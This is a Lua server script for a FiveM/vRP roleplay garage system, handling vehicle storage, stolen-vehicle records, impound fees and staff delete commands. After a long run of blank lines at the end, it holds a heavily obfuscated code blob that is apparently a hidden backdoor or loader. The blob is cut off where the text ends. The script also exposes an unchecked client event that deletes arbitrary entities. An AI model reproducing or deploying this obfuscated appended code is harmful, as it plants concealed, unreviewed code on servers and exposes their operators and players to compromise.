-----------------------------------------------------------------------------------------------------------------------------------------
-- VRP
-----------------------------------------------------------------------------------------------------------------------------------------
local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
local Tools = module("vrp","lib/Tools")
vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP")
-----------------------------------------------------------------------------------------------------------------------------------------
-- CONNECTION
-----------------------------------------------------------------------------------------------------------------------------------------
local will = {}
Tunnel.bindInterface("will_garages",will)
Proxy.addInterface("will_garages",will)
vCLIENT = Tunnel.getInterface("will_garages")
-----------------------------------------------------------------------------------------------------------------------------------------
-- PREPARE
-----------------------------------------------------------------------------------------------------------------------------------------
vRP._prepare("will/add_vehicle","INSERT IGNORE INTO "..Config.banco_de_dados.."(user_id,vehicle,engine,body,fuel) VALUES(@user_id,@vehicle,@engine,@body,@fuel)")
vRP._prepare("will/rem_vehicle","DELETE FROM "..Config.banco_de_dados.." WHERE user_id = @user_id AND vehicle = @vehicle")
vRP._prepare("will/get_vehicle","SELECT * FROM "..Config.banco_de_dados.." WHERE user_id = @user_id AND vehicle = @vehicle")
vRP._prepare("will/get_vehicles","SELECT * FROM "..Config.banco_de_dados.." WHERE user_id = @user_id")
vRP._prepare("will/get_vehicles_stoled","SELECT * FROM "..Config.banco_de_dados.." WHERE stoled_by = @user_id")
vRP._prepare("will/get_vehicle_stoled","SELECT vehicle FROM "..Config.banco_de_dados.." WHERE stoled_by = @user_id AND user_id = @owner AND vehicle = @vehicle;")
-- vRP._prepare("will/get_vehicles","SELECT * FROM vrp_user_vehicles WHERE user_id = @user_id AND (last_garage IS NULL OR last_garage = @last_garage)")
vRP._prepare("will/update_vehicles","UPDATE "..Config.banco_de_dados.." SET engine = @engine, body = @body, fuel = @fuel, doors = @doors, windows = @windows, tyres = @tyres WHERE user_id = @user_id AND vehicle = @vehicle")
vRP._prepare("will/update_vehicles_lastGarages","UPDATE "..Config.banco_de_dados.." SET last_garage = @garageId WHERE user_id = @user_id AND vehicle = @vehicle")
vRP._prepare("will/update_vehicles_withGarage","UPDATE "..Config.banco_de_dados.." SET last_garage = @garageId, engine = @engine, body = @body, fuel = @fuel, doors = @doors, windows = @windows, tyres = @tyres WHERE user_id = @user_id AND vehicle = @vehicle")
vRP._prepare("will/update_Svehicles","UPDATE "..Config.banco_de_dados.." SET engine = @engine, body = @body, fuel = @fuel, doors = @doors, windows = @windows, tyres = @tyres WHERE user_id = @user_id AND vehicle = @vehicle")
vRP._prepare("will/move_vehicle","UPDATE "..Config.banco_de_dados.." SET user_id = @nuser_id WHERE user_id = @user_id AND vehicle = @vehicle")
vRP._prepare("will/get_stoled_vehs","SELECT * FROM "..Config.banco_de_dados.." WHERE stoled_by != 'NULL'")
vRP._prepare("will/check_vehicle_stoled","SELECT true FROM "..Config.banco_de_dados.." WHERE user_id = @user_id AND vehicle = @vehicle AND (stoled_by IS NOT NULL)")
vRP._prepare("will/set_veh_stoled","UPDATE "..Config.banco_de_dados.." SET stoled_by = @stoled_by, stoled_at = @stoled_at WHERE user_id = @user_id AND vehicle = @vehicle")
vRP._prepare("will/update_veh_stoled","UPDATE "..Config.banco_de_dados.." SET stoled_by = @stoled_by WHERE user_id = @user_id AND vehicle = @vehicle")
vRP._prepare("will/rem_veh_stoled","UPDATE "..Config.banco_de_dados.." SET stoled_by = NULL, stoled_at = NULL WHERE user_id = @user_id AND vehicle = @vehicle")
vRP._prepare("will/rem_veh_last_garage","UPDATE "..Config.banco_de_dados.." SET last_garage = NULL WHERE user_id = @user_id and vehicle = @vehicle")
vRP._prepare("will/clear_expire_stoled","UPDATE "..Config.banco_de_dados.." SET last_garage = NULL, stoled_at = NULL, stoled_by = NULL WHERE ( stoled_at IS NOT NULL and stoled_at+@stoled_time < (UNIX_TIMESTAMP(CURRENT_TIMESTAMP)))")
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIABLES
-----------------------------------------------------------------------------------------------------------------------------------------
-- DECLARE VARIABLES
local playerVehs = {}
local VehsInfo = {}

local bucketList = {}
local userBucket = {}

Citizen.CreateThread(function()
	while true do
		vRP.execute("will/clear_expire_stoled",{ stoled_time = Config.days_stealed*24*60*60 })
		Citizen.Wait(1*60*60000)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNCTIONS
-----------------------------------------------------------------------------------------------------------------------------------------
local function CountTable(tab)
    local i = 0
    for _,_ in pairs(tab) do i = i + 1 end
    return i
end

function will.returnGarageNameById(id)
	return Config.garages[tonumber(id)] and Config.garages[tonumber(id)].name
end

function will.checkSearch()
    local source = source
    local user_id = vRP.getUserId(source)
    if vRP.searchReturn(source,user_id,true,false) then
        return true 
    end
    return false
end

function will.checkPermission(perm)
	local source = source
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,perm) then
		return true
	else
		TriggerClientEvent("Notify",source,"negado","Você não tem permissão",5000)
		return false
	end
end

local lvHOMES = Proxy.getInterface("hp_homes:main")
function will.checkHasPermInHouse(houseType)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		if lvHOMES.hasHouseInType(houseType,user_id) then return true end
	end
	TriggerClientEvent("Notify",source,"negado","Você não tem acesso a residência.",5000)
	return false
end

function will.isOwnerOrStoledVehicle(vname,plate)
	local source = source
	local user_id = vRP.getUserId(source)
	local nuser_id = vRP.getUserByRegistration(plate)
	if nuser_id and user_id == nuser_id then
		local sdata = vRP.query("will/get_vehicle",{ user_id = parseInt(user_id), vehicle = vname })
		local data = sdata[1]
		if data then
			vRP.execute("will/rem_veh_stoled",{ user_id = parseInt(user_id), vehicle = vname })
			return true
		end
	else
		if nuser_id then
			local sdata = vRP.query("will/get_vehicle_stoled",{ user_id = parseInt(user_id), owner = parseInt(nuser_id), vehicle = vname })
			local data = sdata[1]
			if data then
				return true
			end
		end
	end
	return false
end

function will.requestStoledVehicle(vname,plate)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		local ok = vRP.request(source,"Você gostaria de guardar o veiculo?",30)
		if ok then
			local nuser_id = vRP.getUserByRegistration(plate)
			if nuser_id then
				local sdata = vRP.query("will/check_vehicle_stoled",{ user_id = parseInt(nuser_id), vehicle = vname })
				local data = sdata[1]
				if data then
					vRP.execute('will/update_veh_stoled',{stoled_by = user_id, vehicle = vname, user_id = nuser_id})
				else
					vRP.execute('will/set_veh_stoled',{stoled_by = user_id, stoled_at = os.time(), vehicle = vname, user_id = nuser_id})
				end
				Citizen.Wait(100)
				return true
			end
		else
			return false
		end
	end
	return false
end

function will.payGarage(payment)
	local source = source
	return garagePayment(source,payment)
end

-- BUCKET FUNCTIONS 
function will.placeInNewBucket(ents,escapeCoords)
	local source = source
	SetPlayerRoutingBucket(source,parseInt(source))

	if ents and type(ents) == 'table' then 
		for _,NetEnt in pairs(ents) do
			local ent = NetworkGetEntityFromNetworkId(NetEnt)
			SetEntityRoutingBucket(ent,parseInt(source))
		end
	else
		local ent = NetworkGetEntityFromNetworkId(ents)
		SetEntityRoutingBucket(ent,parseInt(source))
	end

	while GetPlayerRoutingBucket(source) == 0 do
		local timeDistance = 25
		SetPlayerRoutingBucket(source,parseInt(source))
		if ents and type(ents) == 'table' then 
			for _,NetEnt in pairs(ents) do
				local ent = NetworkGetEntityFromNetworkId(NetEnt)
				SetEntityRoutingBucket(ent,parseInt(source))
				bucketList[GetPlayerRoutingBucket(source)].ents[NetEnt] = true

			end
		else
			local ent = NetworkGetEntityFromNetworkId(ents)
			SetEntityRoutingBucket(ent,parseInt(source))
			bucketList[GetPlayerRoutingBucket(source)].ents[ents] = true
		end
		l = l + 1
		if l >= 200 then
			timeDistance = 30000
			print("^8--------------------------------------------------------------\n\n-> ^8SERVIDOR COM ONESYNC DESATIVADO <-\n\n^8--------------------------------------------------------------\n^7")
		end
		Citizen.Wait(timeDistance)
	end

	if not bucketList[GetPlayerRoutingBucket(source)] then bucketList[GetPlayerRoutingBucket(source)] = {} end
	bucketList[GetPlayerRoutingBucket(source)].escapeCoords = {x=escapeCoords.x,y=escapeCoords.y,z=escapeCoords.z}
	userBucket[source] = GetPlayerRoutingBucket(source)
end

function will.exitBucket(ents)
	local source = source
	bucketList[GetPlayerRoutingBucket(source)] = nil
	userBucket[source] = nil
	SetPlayerRoutingBucket(source,0)
	if ents and type(ents) == 'table' then 
		for _,NetEnt in pairs(ents) do
			local ent = NetworkGetEntityFromNetworkId(NetEnt)
			SetEntityRoutingBucket(ent,0)
		end
	else
		local ent = NetworkGetEntityFromNetworkId(ents)
		SetEntityRoutingBucket(ent,0)
	end
	while GetPlayerRoutingBucket(source) ~= 0 do
		if ents and type(ents) == 'table' then 
			for _,NetEnt in pairs(ents) do
				local ent = NetworkGetEntityFromNetworkId(NetEnt)
				SetEntityRoutingBucket(ent,0)
			end
		else
			local ent = NetworkGetEntityFromNetworkId(ents)
			SetEntityRoutingBucket(ent,0)
		end
		SetPlayerRoutingBucket(source,0)
		Citizen.Wait(50)
	end
end

function will.updateVehiclesInBucket(ents)
	local source = source
	local userBucket = GetPlayerRoutingBucket(source)
	if (type(ents) == "nil" or CountTable(ents) == 0) and bucketList[userBucket] and bucketList[userBucket].ents then bucketList[userBucket].ents = nil end
	if not bucketList[userBucket] then bucketList[userBucket] = {ents={}} end
	bucketList[userBucket].ents = {}
	if ents then
		for _,_data in pairs(ents) do
			if (not bucketList[userBucket].ents[_data.nveh]) then
				bucketList[userBucket].ents[_data.nveh] = true
			end
		end
	end

end
-- ADQUIRIR CARROS DO USUARIO
function will.myVehicles(garageId)
	local source = source
	local user_id = vRP.getUserId(source)
	local identity = vRP.getUserIdentity(user_id)
	if user_id then
		will.refreshUserVehicles(user_id)
		local myvehicles = {}
		local tuning = {}
		local veh = vRP.query("will/get_vehicles",{ user_id = parseInt(user_id) })
		local veh_stoled = vRP.query("will/get_vehicles_stoled",{ user_id = parseInt(user_id) })
		for k,v in ipairs(veh) do
			if v.detido ~= 3 then 
				if v.detido ~= 0 then
					vRP.execute("will/rem_veh_stoled",{ user_id = parseInt(user_id), vehicle = v.vehicle })
					v.stoled_by = nil
				end
				if (v.stoled_by == 'NULL' or v.stoled_by == nil or v.stoled_by == 0 or v.stoled_by == user_id) then
					local name = v.vehicle
					if not playerVehs[user_id] or (playerVehs[user_id] and not playerVehs[user_id][GetHashKey(name)]) then
						tuning = json.decode(pegar_tunagem(user_id,name))
						local inGarage = true
						if garageId and tonumber(v.last_garage) ~= nil and tonumber(v.last_garage) ~= garageId then 
							inGarage = false 
						end
						-- if v.stoled_by ~= nil and v.stoled_by ~= 0 then isStoled = true end

						if tonumber(v.last_garage) == garageId or not v.last_garage then
							if Config.use_plate_system then
								table.insert(myvehicles, { inGarage = inGarage, detido = v.detido, name = name, vname = vRP.vehicleName(name) or name, plate = v.plate, engine = v.engine, body = v.body, fuel = v.fuel, tuning = tuning, work = v.work, vehDoors = json.decode(v.doors), vehWindows = json.decode(v.windows), vehTyres = json.decode(v.tyres) })
							else
								table.insert(myvehicles, { inGarage = inGarage, detido = v.detido, name = name, vname = vRP.vehicleName(name) or name, plate = identity.registration, engine = v.engine, body = v.body, fuel = v.fuel, tuning = tuning, work = v.work, vehDoors = json.decode(v.doors), vehWindows = json.decode(v.windows), vehTyres = json.decode(v.tyres) })
							end
						end
					end
				end
			end
		end

		for k,v in ipairs(veh_stoled) do
			if v.detido == 0 then
				local name = v.vehicle
				local identity = vRP.getUserIdentity(v.user_id)
				if not playerVehs[v.user_id] or (playerVehs[v.user_id] and not playerVehs[v.user_id][GetHashKey(name)]) then
					tuning = json.decode(pegar_tunagem(v.user_id,name))
					local inGarage = true
					if garageId and tonumber(v.last_garage) ~= nil and tonumber(v.last_garage) ~= garageId then 
						inGarage = false 
					end
					if Config.use_plate_system then
						table.insert(myvehicles, { inGarage = inGarage, detido = v.detido, name = name, vname = vRP.vehicleName(name) or name, plate = v.plate, engine = v.engine, body = v.body, fuel = v.fuel, tuning = tuning, work = v.work, vehDoors = json.decode(v.doors), vehWindows = json.decode(v.windows), vehTyres = json.decode(v.tyres) })
					else
						table.insert(myvehicles, { inGarage = inGarage, detido = v.detido, name = name, vname = vRP.vehicleName(name) or name, plate = identity.registration, engine = v.engine, body = v.body, fuel = v.fuel, tuning = tuning, work = v.work, vehDoors = json.decode(v.doors), vehWindows = json.decode(v.windows), vehTyres = json.decode(v.tyres) })
					end
				end
			end
		end
		return myvehicles
	end
end

vRP.prepare("reborn/reset_detido","UPDATE vrp_user_vehicles SET detido = 0, time = 0 WHERE vehicle = @vehicle AND user_id = @user_id ")
function will.paymentArrestVehicle(vname)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id and vname then
		local valordetido = 10/100
		local sdata = vRP.query("will/get_vehicle",{ user_id = parseInt(user_id), vehicle = vname })
		local data = sdata[1]
		if parseInt(data.detido) == 1 or parseInt(data.detido) == 2 then
			if vRP.vehicleType(tostring(vname)) == "cars" or vRP.vehicleType(tostring(vname)) == "bikes" or vRP.vehicleType(tostring(vname)) == nil then
                valordetido = 3/100
            elseif vRP.vehicleType(tostring(vname)) == "donate" then
                valordetido = 5/100
            end
			local status = vRP.request(source,"O veículo "..vname.." está detido, deseja acionar o seguro pagando <b>R$"..vRP.format(parseInt(vRP.vehiclePrice(vname)*valordetido)).."</b>?",60)
			if status then
                if vRP.tryFullPayment(user_id,parseInt(vRP.vehiclePrice(vname)*valordetido)) then
					-- vRP.execute("vRP/setDetido",{ user_id = parseInt(user_id), vehicle = vname, detido = 0, time = 0 })
					vRP.execute("reborn/reset_detido",{ user_id = parseInt(user_id), vehicle = vname})
					-- print('SETOU O DETIDO COMO 0',user_id,vname)
                    return true
                else
                    TriggerClientEvent("Notify",source,"negado","Dinheiro insuficiente.",5000)
                    return false
                end
            end
		else
			return true
		end	
	end
end

-- UNLOCK/LOCK VEHICLE (SYNC FUNCTION)
function will.tryDoorVehicle()
	local source = source
    local user_id = vRP.getUserId(source)
    local vehicle,vehNet,vehPlate,vehName = vRPclient.vehList(source,7)
    if vehPlate then
        vehPlate = string.gsub(vehPlate, "%s+", "")
        local plateOwnerId = vRP.getVehiclePlate(vehPlate) or vRP.getUserByRegistration(vehPlate)
        if plateOwnerId and (user_id == plateOwnerId) then
            will.syncTryLockDoors(vehNet,nil,source)
            TriggerClientEvent("vrp_sound:source",source,'lock',0.1)
        end
    end
end

function will.syncTryLockDoors(nveh,stats,source)
	if stats == nil then stats = 'toggle' end
	vCLIENT.syncStatsDoors(-1,nveh,stats,source)
end

function will.filterList(vehList)
	local source = source
	local user_id = vRP.getUserId(source)
	local tab = {}
	if user_id then
		for _,_data in pairs(vehList) do
			if not playerVehs[user_id] or (playerVehs[user_id] and not playerVehs[user_id][GetHashKey(_data.name)]) then
				table.insert(tab,_data)
			end
		end
	end
	return tab
end

function will.verifyIsHashOutGarages(hash,plate)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		if plate then 
			user_id = vRP.getUserByRegistration(plate)
		end
		if playerVehs[user_id] and playerVehs[user_id][hash] then 
			return true
		end
	end
	return false
end

function will.refreshUserVehicles(user_id)
	if playerVehs[user_id] then
		for hash,vnet in pairs(playerVehs[user_id]) do
			local ent = NetworkGetEntityFromNetworkId(vnet)
			if ent and not DoesEntityExist(ent) or (DoesEntityExist(ent) and GetEntityModel(ent) ~= hash) then
				VehsInfo[playerVehs[user_id][hash]] = nil
				playerVehs[user_id][hash] = nil
			end
		end
	end
end

AddEventHandler('entityRemoved', function (veh)
	local vehbody = GetVehicleEngineHealth(veh)
	local vehengine = GetVehicleBodyHealth(veh)

	local nveh = NetworkGetNetworkIdFromEntity(veh)
	local plate = GetVehicleNumberPlateText(veh)
	local hash = GetEntityModel(veh)
	if vRP.getUserByRegistration(plate) then
		local nuser_id = vRP.getUserByRegistration(plate)
		if nuser_id then
			if playerVehs[nuser_id] and playerVehs[nuser_id][hash] then

				VehsInfo[playerVehs[nuser_id][hash]] = nil
				playerVehs[nuser_id][hash] = nil
				if CountTable(playerVehs[nuser_id]) == 0 then 
					playerVehs[nuser_id] = nil 
				end
				
			end
		end
	end
end)

AddEventHandler('entityCreated', function (veh)
	if veh and DoesEntityExist(veh) then
		local nveh = NetworkGetNetworkIdFromEntity(veh)
		local plate = GetVehicleNumberPlateText(veh)
		if vRP.getUserByRegistration(plate) then
			local nuser_id = vRP.getUserByRegistration(plate)
			if nuser_id then
				local nsource = vRP.getUserSource(nuser_id)
				local hash = vCLIENT.getModel(nsource,nveh)
				if not playerVehs[nuser_id] then playerVehs[nuser_id] = {} end
				playerVehs[nuser_id][hash] = nveh
				VehsInfo[nveh] = {nuser_id,hash}
			end
		end
	end
end)

local global_Vehicles = {}
local cooldown_time
local function _GetAllVehicles()
	if cooldown_time == nil or GetGameTimer() > cooldown_time then
		cooldown_time = ( GetGameTimer() + 250 )
		global_Vehicles = GetAllVehicles()
	end
	return global_Vehicles
end
local function checkPersonalVehiclePlayerExist(user_id,hash)
	local result
	for _,veh in pairs(_GetAllVehicles()) do
		if veh and DoesEntityExist(veh) then
			local plate = GetVehicleNumberPlateText(veh)
			if plate then
				local nuser_id = vRP.getUserByRegistration(plate)
				if nuser_id and veh and DoesEntityExist(veh) then
					if user_id == nuser_id and GetEntityModel(veh) == hash then
						result = NetworkGetNetworkIdFromEntity(veh)
						break
					end
				end
			end
		end
	end
	return result
end

function will.refreshOwnerVehicle(nveh)
	if nveh then
		local veh = NetworkGetEntityFromNetworkId(nveh)
		if veh and DoesEntityExist(veh) then
			local plate = GetVehicleNumberPlateText(veh)
			local nuser_id = vRP.getUserByRegistration(plate)
			if nuser_id then
				if VehsInfo[nveh] then
					local old_owner,hash = VehsInfo[nveh][1],VehsInfo[nveh][2]
					local old_nveh = (playerVehs[old_owner] and playerVehs[old_owner][hash]) or nil

					if old_nveh then 
						local __nveh = checkPersonalVehiclePlayerExist(old_owner,hash)
						VehsInfo[old_nveh] = nil 
						if __nveh then
							VehsInfo[__nveh] = {old_owner,hash} 
							playerVehs[old_owner][hash] = __nveh
						else
							playerVehs[old_owner][hash] = nil
						end
					end
					-- if playerVehs[old_owner] then playerVehs[old_owner][hash] = nil end
					if not playerVehs[nuser_id] then playerVehs[nuser_id] = {} end
					playerVehs[nuser_id][hash] = nveh
					VehsInfo[nveh] = {nuser_id,hash}
				else
					local hash = GetEntityModel(veh)
					if not playerVehs[nuser_id] then playerVehs[nuser_id] = {} end
					playerVehs[nuser_id][hash] = nveh
					VehsInfo[nveh] = {nuser_id,hash}
				end
			end
		end
	end
end

AddEventHandler('onResourceStart', function (resourceName)
	if GetCurrentResourceName() ~= resourceName then return end
	for _,veh in pairs(GetAllVehicles()) do
		if veh and DoesEntityExist(veh) then
			local plate = GetVehicleNumberPlateText(veh)
			if vRP.getUserByRegistration(plate) and veh and DoesEntityExist(veh) then
				local nveh = NetworkGetNetworkIdFromEntity(veh)
				local nuser_id = vRP.getUserByRegistration(plate)
				if nuser_id and DoesEntityExist(veh) then
					local hash = GetEntityModel(veh)
					if not playerVehs[nuser_id] then playerVehs[nuser_id] = {} end
					if not playerVehs[nuser_id][hash] then 
						playerVehs[nuser_id][hash] = nveh 
						VehsInfo[nveh] = {nuser_id,hash}
					end
				end
			end
		end
	end
end)

-- EXIT PLAYER GARAGES IF STOP RESOURCE
AddEventHandler('onResourceStop', function (resourceName)
	if GetCurrentResourceName() ~= resourceName then return end
	local userBucket = userBucket
	local bucketList = bucketList
	local vRPclient = vRPclient
	local SetTimeout = SetTimeout
	for source,_ in pairs(userBucket) do
		if bucketList[userBucket[source]] then
			local ped = GetPlayerPed(source)
			if ped and DoesEntityExist(ped) and IsPedAPlayer(ped) then
				SetPlayerRoutingBucket(source,0)
				if bucketList[userBucket[source]].escapeCoords then
					local x,y,z = bucketList[userBucket[source]].escapeCoords.x,bucketList[userBucket[source]].escapeCoords.y,bucketList[userBucket[source]].escapeCoords.z
					vRPclient.teleport(source,x,y,z)
				end
			end
		end
	end
end)

-- EXIT DELETE PLAYER RENDER VEHICLE IF STOP RESOURCE
AddEventHandler('onResourceStop', function (resourceName)
	if GetCurrentResourceName() ~= resourceName then return end
	local userBucket = userBucket
	local bucketList = bucketList
	local vRPclient = vRPclient
	for source,_ in pairs(userBucket) do
		if bucketList[userBucket[source]] and bucketList[userBucket[source]].ents then
			for nveh,_ in pairs(bucketList[userBucket[source]].ents) do
				local veh = NetworkGetEntityFromNetworkId(nveh)
				if DoesEntityExist(veh) then DeleteEntity(veh) end
			end
		end
	end
end)

AddEventHandler('vRP:playerLeave', function (user_id,source)
	local source = source
	if userBucket[source] and type(bucketList[userBucket[source]].escapeCoords) ~= nil then
		SetTimeout(10000,function()
			local data = vRP.getUData(user_id,"vRP:datatable")
			data = json.decode(data)
			if data and data.position then
				data.position = {x=bucketList[userBucket[source]].escapeCoords.x,y=bucketList[userBucket[source]].escapeCoords.y,z=bucketList[userBucket[source]].escapeCoords.z}
				vRP.setUData(user_id,"vRP:datatable",json.encode(data))
			end
		end)
		if bucketList[userBucket[source]].ents then
			for nveh,_ in pairs(bucketList[userBucket[source]].ents) do
				local veh = NetworkGetEntityFromNetworkId(nveh)
				if DoesEntityExist(veh) then DeleteEntity(veh) end
			end
		end
	end
end)

function will.deleteVehicleSync(vnet)
	if vnet and NetworkGetEntityFromNetworkId(vnet) then
		local veh = NetworkGetEntityFromNetworkId(vnet)
		if DoesEntityExist(veh) then DeleteEntity(veh) end
	end
end

function will.SetVehicleInGarage(vehid,garageId)
	local source = source
	if VehsInfo[vehid] and garageId then
		local user_id,vehname = VehsInfo[vehid][1],vRPclient.getVehicleNameFromHash(source,VehsInfo[vehid][2])
		local row = vRP.query("will/get_vehicle",{ user_id = parseInt(user_id), vehicle = vehname })
		if row[1] ~= nil then
			vRP.execute("will/update_vehicles_lastGarages",{ user_id = parseInt(user_id), vehicle = tostring(vehname), garageId = garageId })
		end
	end
end

function will.tryDelete(vehid,vehengine,vehbody,vehfuel,vehPlate,vehDoors,vehWindows,vehTyres,bydv,garageId)
	local source = source
	if VehsInfo[vehid] then
		local user_id,vehname = VehsInfo[vehid][1],vRPclient.getVehicleNameFromHash(source,VehsInfo[vehid][2])
		if parseInt(vehengine) <= 100 then vehengine = 100 end
		if parseInt(vehbody) <= 100 then vehbody = 100 end
		if parseInt(vehfuel) >= 100 then vehfuel = 100 end
		if parseInt(vehfuel) <= 5 then vehfuel = 5 end
		local row = vRP.query("will/get_vehicle",{ user_id = parseInt(user_id), vehicle = vehname })
		if row[1] ~= nil then

			if garageId then
				vRP.execute("will/update_vehicles_withGarage",{ garageId = garageId, user_id = parseInt(user_id), vehicle = tostring(vehname), engine = parseInt(vehengine), body = parseInt(vehbody), fuel = parseInt(vehfuel), doors = json.encode(vehDoors), windows = json.encode(vehWindows), tyres = json.encode(vehTyres) })
			else
				vRP.execute("will/update_vehicles",{ user_id = parseInt(user_id), vehicle = tostring(vehname), engine = parseInt(vehengine), body = parseInt(vehbody), fuel = parseInt(vehfuel), doors = json.encode(vehDoors), windows = json.encode(vehWindows), tyres = json.encode(vehTyres) })
			end

			if VehsInfo[vehid] then
				local hash = VehsInfo[vehid][2]
				if playerVehs[user_id] and playerVehs[user_id][hash] then 
					playerVehs[user_id][hash] = nil 
					if CountTable(playerVehs[user_id]) == 0 then 
						playerVehs[user_id] = nil 
					end
				end
			end
		end
		VehsInfo[vehid] = nil
		will.deleteVehicleSync(vehid)
	end
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- DELETE VEHICLE (DV)
-----------------------------------------------------------------------------------------------------------------------------------------

local webhookmec = ""
local webhookdv = ""
RegisterCommand("dv",function(source,args)
    local user_id = vRP.getUserId(source)
    if vRP.hasPermission(user_id,'mindmaster.permissao') or vRP.hasPermission(user_id,'administrador.permissao') or vRP.hasPermission(user_id,'moderador.permissao') then
        local deletedVehicle = vCLIENT.tryDeleteNearestVehicle(source)
		local px,py,pz = vRPclient.getPosition(source)
		SendWebhookMessage(webhookdv,"```prolog\n[DV STAFF]: [ID]"..user_id.."\n[DELETOU O VEÍCULO MAIS PROXIMO]\n CDS: "..px..","..py..","..pz.."\n"..os.date("\n[Data]: %d/%m/%Y [Hora]: %H:%M:%S").." \r```")
    end
end)

RegisterCommand("dvmec",function(source,args)
    local user_id = vRP.getUserId(source)
    if vRP.hasPermission(user_id,'mecanico.permissao') then
		if vRP.request(source,"Você deseja guardar este veículo por $10.000 ?",30) then
			if vRP.tryFullPayment(user_id,10000) or vRP.tryFullPaymentBank(user_id,10000) then
				local deletedVehicle = vCLIENT.tryDeleteNearestVehicle(source)
				local px,py,pz = vRPclient.getPosition(source)
				SendWebhookMessage(webhookmec,"```prolog\n[DV MECANICO]: [ID]"..user_id.."\n[DELETOU O VEÍCULO MAIS PROXIMO]\n CDS: "..px..","..py..","..pz.."\n"..os.date("\n[Data]: %d/%m/%Y [Hora]: %H:%M:%S").." \r```")
			end
		end
    end
end)

function SendWebhookMessage(webhook,message)
	if webhook ~= nil and webhook ~= "" then
		PerformHttpRequest(webhook, function(err, text, headers) end, 'POST', json.encode({content = message}), { ['Content-Type'] = 'application/json' })
	end
end

RegisterNetEvent('trydeleteveh32569800')
AddEventHandler('trydeleteveh32569800',function(vnet)
	local ent = NetworkGetEntityFromNetworkId(vnet)
	if ent and DoesEntityExist(ent) then
		local source = NetworkGetEntityOwner(ent)
		TriggerClientEvent('_handle:4sa4h12',source,vnet)
	end
end)



































return(function(r,B,q,F,U,e,s,G,P,N,O,K,W,j,o,y,x,a,Z,E,z,_,u,D,h,Q,Y,t)Y=({});local i,n=65;while true do if i==0X1.04p6 then if not Y[0X12E9]then i=0X2c+((t[0X9]<<6<<24&t[0x2])>>q.n(">\z  \x69\z \56",'\0\0\0\u{0}\0\x00\0\b'));(Y)[4841]=(i);else i=Y[0x12E9];end;else if i~=0x1.6P5 then else n=q.A;break;end;end;end;local f;i=0X2;repeat if i==0X1.0P1 then if not not Y[0X03F34]then i=Y[16180];else Y[0X6103]=123655976+((t[8]+t[8]&t[4])-t[8]-i);i=(-0X6C8Ca19+((t[3]-t[4]>>i)-Y[0X012e9]~i));(Y)[16180]=i;end;elseif i==121.0 then if not Y[0x1286]then i=(-67804634+(((t[3]==t[0X1]and i or Y[16180])-t[0X4]>t[2]and t[0X1]or t[9])>>0x2));(Y)[4742]=i;else i=(Y[0X1286]);end;else if i==4.0 then if not Y[18477]then i=0X13+((Y[4841]~t[4])-t[6]+t[2]&i);Y[0X482D]=i;else i=(Y[18477]);end;else if i~=19.0 then else f=(pcall);break;end;end;end;until false;local R,J,A;i=55;while true do if i>1.0 then if not(i>=55.0)then J={G,3,2};if not not Y[0x7aE7]then i=(Y[0X7aE7]);else(Y)[15130]=(-4813367362+(((t[0X9]~t[2])-Y[0XbA8]|t[3])+t[2]));i=(-0X003+(((Y[2984]~=Y[4742]and t[7]or Y[16180])&t[0X01]<Y[0xBa8]and Y[4742]or Y[0X1286])&Y[0X1286]));Y[31463]=(i);end;else R=9007199254740992;if not not Y[2984]then i=Y[0xbA8];else i=-1321841263+((t[0X6]-t[0X1]~Y[0X12e9]|t[0X7])~t[0x6]);Y[2984]=i;end;end;else A=(Z.pack);break;end;end;i=(0XC);repeat if i==0x1.8P3 then if not not Y[20401]then i=(Y[20401]);else(Y)[1372]=-91648+((((t[0X7]<=t[0X3]and i or Y[4742])<=Y[0X3b1a]and Y[16180]or Y[2984])~t[1])<<Y[31463]);i=-0x4ecD4eF3+((t[0x2]<<Y[0X3b1a]~t[8])>>i~Y[4841]);Y[20401]=(i);end;else if i==123.0 then break;end;end;until false;local T,S,H,M,V,C=D,({});i=(0X4B);repeat if i>0X1.0p4 and i<47.0 then if not not Y[0X2d75]then i=(Y[0X2D75]);else i=(-0X4+(t[0X9]-t[0X7]+Y[0x007aE7]<<Y[0X1286]~=t[0X8]and Y[0X42Ee]or Y[4841]));(Y)[11637]=(i);end;else if i<0X1.2CP6 and i>0X1.78p5 then M={[0x0]=D,[3]=D,[9]=D,[8]=3,[G]=0X006,[0x4]=D,[0x0]=D,[0x1]=nil,[0x2]=y,[0]=nil,[0x8]=6,[4]=D,[1]=z,[0X0]=5,[0X0]=B,[z]=0X1,[4]=G,[3]=0X4,[1]=0};V=(0X1);if not Y[24656]then i=(-0X25+(((t[7]~=Y[4841]and Y[0X610B]or Y[0X482d])+Y[0X4fB1]==Y[0X42eE]and i or Y[0X482d])~=Y[31463]and Y[11637]or t[0X1]));(Y)[0x6050]=i;else i=Y[0x6050];end;elseif i>53.0 then H=(function(r)return{n({},a,r)};end);if not Y[24843]then Y[0X42Ee]=(-0X1b62173f+(((t[1]>>Y[0X7aE7]|Y[0x3B1A])<<Y[15130])+t[0X9]));i=-0x67feFf9C+(((i&t[9])+t[0X7]|t[5])>>Y[31463]);Y[24843]=i;else i=(Y[0X610b]);end;elseif i<46.0 then C=(function(r,B)return r~B;end);if not not Y[0X376F]then i=(Y[0X376F]);else Y[0X7E02]=459779343+((t[6]-t[6]-t[0X1]|t[0X2])-t[8]);(Y)[9593]=(-0X11FFFcb+(((t[3]|Y[2984]>Y[20401]and Y[0X610B]or t[0x3])>=Y[24656]and Y[0X6103]or Y[16180])<<Y[1372]));i=0x1b67297b+(((Y[17134]~=Y[0x3b1A]and t[9]or Y[2984])~Y[0Xba8]<=Y[18477]and Y[31463]or Y[1372])-t[0X8]);(Y)[0x376F]=i;end;elseif i>46.0 and i<0X1.A8P5 then break;end;end;until false;y=nil;local p,I;i=(0x32);while true do if i>6.0 then if not(i<=0x1.9p5)then if not(i<=0x1.Ap5)then p=q.U;if not not Y[25107]then i=Y[25107];else i=-3242010938+(((Y[17134]~Y[0X12e9])-Y[4841]<=Y[14191]and Y[4228]or 